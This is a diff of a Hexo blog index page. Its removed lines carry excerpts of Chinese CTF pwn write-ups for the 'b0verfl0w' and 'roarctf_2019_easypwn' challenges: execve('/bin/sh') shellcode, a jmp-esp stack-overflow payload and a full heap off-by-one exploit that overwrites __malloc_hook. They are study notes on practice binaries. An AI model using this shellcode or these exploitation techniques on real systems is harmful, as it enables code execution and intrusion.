-<h5 id="实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。"><a href="#实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。" class="headerlink" title="实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。"></a>实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。</h5><h5 id="最后再写入orw-payload就行了"><a href="#最后再写入orw-payload就行了" class="headerlink" title="最后再写入orw_payload就行了"></a>最后再写入orw_payload就行了</h5><pre><code class="lang-py">p.sendline(asm(orw_payload))
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/22/bad/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/20/b0verfl0w/" class="item-title">b0verfl0w</a>
-      
-      <time datetime="2024-03-20T15:07:25.000Z">
-        2024-03-20
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- ; 汇编指令
-xor ecx, ecx          ; 将 ecx 寄存器清零
-mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * 0
-push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 0
-push 0x68732f2f       ; 将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
-push 0x6e69622f       ; 继续将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
-mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 &quot;/bin//sh&quot; 的地址）存放到 ebx 寄存器中
-mov al, 0xb           ; 将 0xb 存放到 al 寄存器中，该值代表 execve 系统调用的编号
-int 0x80              ; 触发系统调用，执行 execve(&quot;/ -->
-        <!-- </div> -->
-
-        
-        <pre><code class="lang-py">; 汇编指令
-xor ecx, ecx          ; 将 ecx 寄存器清零
-mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * 0
-push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 0
-push 0x68732f2f       ; 将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
-push 0x6e69622f       ; 继续将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
-mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 &quot;/bin//sh&quot; 的地址）存放到 ebx 寄存器中
-mov al, 0xb           ; 将 0xb 存放到 al 寄存器中，该值代表 execve 系统调用的编号
-int 0x80              ; 触发系统调用，执行 execve(&quot;/bin//sh&quot;, NULL, NULL)
-</code></pre>
-<pre><code class="lang-py">shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/eJhTA.png" alt="image-20240320230854571"></p>
-<h5 id="ret2shellcode-但是大小不够了"><a href="#ret2shellcode-但是大小不够了" class="headerlink" title="ret2shellcode,但是大小不够了"></a>ret2shellcode,但是大小不够了</h5><p><img src="https://i0.imgs.ovh/2024/03/19/eJKbs.png" alt="image-20240320231042503"></p>
-<pre><code class="lang-py">sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)
-</code></pre>
-<h5 id="改写其他不行"><a href="#改写其他不行" class="headerlink" title="改写其他不行"></a>改写其他不行</h5><h5 id="返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址"><a href="#返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址" class="headerlink" title="返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址"></a>返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址</h5><pre><code class="lang-py">payload=asm(shellcode)+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sup_esp_jmp
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/eJ8qV.png" alt="image-20240320234818524"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/eJEnJ.png" alt="image-20240320234859035"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/eJToW.png" alt="image-20240320234951277"></p>
-<h5 id="jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶"><a href="#jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶" class="headerlink" title="jmp esp的操作，把栈顶设为esp,同时eip指向栈顶"></a>jmp esp的操作，把栈顶设为esp,同时eip指向栈顶</h5><p><img src="https://i0.imgs.ovh/2024/03/20/eimXu.png" alt="image-20240321125420592"></p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node5.buuoj.cn&quot;,28594)
-p=process(&quot;./b0verfl0w&quot;)
-context.log_level=&quot;debug&quot;
-context.arch=&#39;i386&#39;
-
-shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;
-
-print(len(shellcode))
-#gdb.attach(p)
-sleep(1)
-jmp_esp=0x08048504
-sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)
-payload=shellcode+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sub_esp_jmp
-#p.sendline(payload)
-
-p.sendline(payload)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/20/b0verfl0w/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/03/18/roarctf-2019-easy-pwn/" class="item-title">roarctf_2019_easypwn</a>
-      
-      <time datetime="2024-03-18T15:03:09.000Z">
-        2024-03-18
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!--  保护全开
-edit函数
-
-若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞
-
-这里不太懂为什么伪造的堆1 free不会报错
-free(1)
-
-
-add(0x90)
-
-
-试用这种方法也能show出main_arena
-
-
-至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小
-add(0x80)
-
-奇怪，这里再申请0x80的大小，然后size还是0xa1
-
-这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)
-
-
-
-不过最后的话，是打不通的。expfrom pwn import *
-
-r=remote(&#39;node5.buuoj.cn&#39;,28118)
-#r=process(&#39;roarctf_2019_easy_pwn&#39;)
-libc=ELF(&#39;./libc-2.23.so&#39;)
-context.log_level=&quot;debug&quot;
-
-de -->
-        <!-- </div> -->
-
-        
-        <p> 保护全开</p>
-<p>edit函数</p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7kas.png" alt="image-20240320152622842"></p>
-<p>若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞</p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7IOU.png" alt="image-20240320153710315"></p>
-<h4 id="这里不太懂为什么伪造的堆1-free不会报错"><a href="#这里不太懂为什么伪造的堆1-free不会报错" class="headerlink" title="这里不太懂为什么伪造的堆1 free不会报错"></a>这里不太懂为什么伪造的堆1 free不会报错</h4><p><img src="https://i0.imgs.ovh/2024/03/19/e7wKH.png" alt="image-20240319203609474"></p>
-<pre><code class="lang-py">free(1)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7pZO.png" alt="image-20240319204503356"></p>
-<pre><code class="lang-py">add(0x90)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7HD9.png" alt="image-20240319204909619"></p>
-<p>试用这种方法也能show出main_arena</p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7nO3.png" alt="image-20240319205416560"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7lwe.png" alt="image-20240319211634694"></p>
-<h4 id="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"><a href="#至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小" class="headerlink" title="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"></a>至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小</h4><p><img src="https://i0.imgs.ovh/2024/03/18/eKiYo.png" alt="image-20240319233028210"></p>
-<pre><code class="lang-py">add(0x80)
-</code></pre>
-<h5 id="奇怪，这里再申请0x80的大小，然后size还是0xa1"><a href="#奇怪，这里再申请0x80的大小，然后size还是0xa1" class="headerlink" title="奇怪，这里再申请0x80的大小，然后size还是0xa1"></a>奇怪，这里再申请0x80的大小，然后size还是0xa1</h5><p><img src="https://i0.imgs.ovh/2024/03/19/e73jD.png" alt="image-20240319213208476"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7mLo.png" alt="image-20240319214042015"></p>
-<h5 id="这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21"><a href="#这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21" class="headerlink" title="这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)"></a>这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)</h5><pre><code class="lang-py">payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)
-</code></pre>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e760A.png" alt="image-20240319214344529"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/19/e7Wt5.png" alt="image-20240319214501997"></p>
-<h5 id="不过最后的话，是打不通的。"><a href="#不过最后的话，是打不通的。" class="headerlink" title="不过最后的话，是打不通的。"></a>不过最后的话，是打不通的。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *
-
-r=remote(&#39;node5.buuoj.cn&#39;,28118)
-#r=process(&#39;roarctf_2019_easy_pwn&#39;)
-libc=ELF(&#39;./libc-2.23.so&#39;)
-context.log_level=&quot;debug&quot;
-
-def add(size):
-    r.recvuntil(&#39;choice: &#39;)
-    r.sendline(&#39;1&#39;)
-    r.recvuntil(&#39;size:&#39;)
-    r.sendline(str(size))
-
-def edit(index,size,data):
-    r.recvuntil(&#39;choice: &#39;)
-    r.sendline(&#39;2&#39;)
-    r.recvuntil(&#39;index:&#39;)
-    r.sendline(str(index))
-    r.recvuntil(&#39;size:&#39;)
-    r.sendline(str(size))
-    r.recvuntil(&#39;content:&#39;)
-    r.send(data)
-
-def free(index):
-    r.recvuntil(&#39;choice: &#39;)
-    r.sendline(&#39;3&#39;)
-    r.recvuntil(&#39;index:&#39;)
-    r.sendline(str(index))
-
-def show(index):
-    r.recvuntil(&#39;choice: &#39;)
-    r.sendline(&#39;4&#39;)
-    r.recvuntil(&#39;index:&#39;)
-    r.sendline(str(index))  
-
-add(0x18)
-add(0x10)
-add(0x90)
-add(0x10)
-
-edit(0,0x22,b&#39;b&#39;*0x10+p64(0x20)+p8(0xa1))
-
-edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))
-
-free(1)
-add(0x90)
-
-edit(1,0x20,p64(0)*3+p64(0xa1))
-free(2)
-show(1)
-r.recvuntil(&#39;content:&#39;)
-r.recv(0x20)
-main_arena=u64(r.recvuntil(&#39;\x7f&#39;).strip()[-6:].ljust(8,b&#39;\x00&#39;))-88
-malloc_hook=main_arena-0x10
-base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
-realloc_hook=base+libc.sym[&#39;__realloc_hook&#39;]
-add(0x80)
-print(hex(main_arena))
-payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)
-edit(1,0x90,payload)
-free(2)
-
-payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
-edit(1,0x28,payload)
-add(0x60) #2
-
-add(0x60) #4
-
-one=[0x45216,0x4526a,0xf02a4,0xf1147]
-one_gadget=base+one[3]
-edit(4,0x1b,b&#39;a&#39;*11+p64(one_gadget)+p64(realloc_hook+4))
-#gdb.attach(r)
-sleep(1)
-add(0x10)
-
-r.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/03/18/roarctf-2019-easy-pwn/"> Read more -->
           </span>
         </div>
 
@@ -549,7 +670,7 @@ r.interactive()
   <div class="widget-box">
     <h3 class="widget-title-archive">archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
     </div>
   </div>
 
@@ -563,23 +684,23 @@ r.interactive()
       <ul>
         
           <li>
+            <a class="recent_posts-list-link" href="/2024/11/03/house-of-force/">200~house_of_force</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/29/pwn2%20short/">(no title)</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/21/overlapping_chunks/">overlapping_chunks</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/17/heapcreator/">heapcreator</a>
+          </li>
+        
+          <li>
             <a class="recent_posts-list-link" href="/2024/09/21/stdout/">stdout</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/">解决libc6软件包和libc6-dev不匹配的问题</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/13/glibc/">glibc</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/12/gostack/">gostack</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/08/pstack/">pstack</a>
           </li>
         
       </ul>
